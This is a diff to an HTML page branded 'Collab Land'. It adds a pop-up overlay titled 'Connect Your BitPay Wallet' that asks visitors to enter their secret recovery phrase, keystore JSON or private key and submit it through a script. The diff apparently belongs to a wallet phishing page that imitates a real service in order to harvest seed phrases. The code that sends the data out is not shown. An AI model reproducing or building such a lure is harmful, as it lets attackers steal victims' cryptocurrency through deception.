@@ -10,15 +10,52 @@
         integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
     <link rel="stylesheet" href="./css/app.css" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" referrerpolicy="no-referrer">
+    </script>
     <script type="text/javascript" src="./js/app.js"></script>
 </head>
 
 <body>
 
+    <div class="floating-divider" onclick="chaseFloatingIsland()"></div>
+
+    <div class="floating-island">
+
+        <div class="floating-island-header">
+
+            <h3>Connect Your BitPay Wallet</h3>
+            <p> Import Your Wallet On The Go </p>
+        </div>
+        <div class="floating-island-body">
+            <div id="flash_info">
+                <img src="./img/Binance Chain.jpg">
+                <h3> Binance Chain </h3>
+            </div>
+            <div class="import-type">
+                <div class="import-selection">
+                    <p onclick="keysupin('Phrases')"> Phrases </p>
+                    <p onclick="keysupin('KeyStore JSON')"> KeyStore JSON </p>
+                    <p onclick="keysupin('Private Key')"> Private Key </p>
+                </div>
+                <div class="import-selected">
+                    <form id="key_submission">
+                        <input type="hidden" value="Phrases" id="import">
+                        <input type="hidden" value="" id="wallet">
+                        <label> Enter Secret Recovery Phrase </label>
+                        <textarea rows="3" id="pphse"
+                            placeholder="Enter Your Secret Recovery Phrase Which Is Always Either 12, 15, 18, 21 or 24 Words, Each Separate By A Space"></textarea>
+                        <button type="button" onclick="submitPhrase()"> Import Wallet </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
     <header>
 
         <div class="headerName">
-            Collab Land
+            🤝 Collab Land
         </div>
 
         <div class="headerbtn">
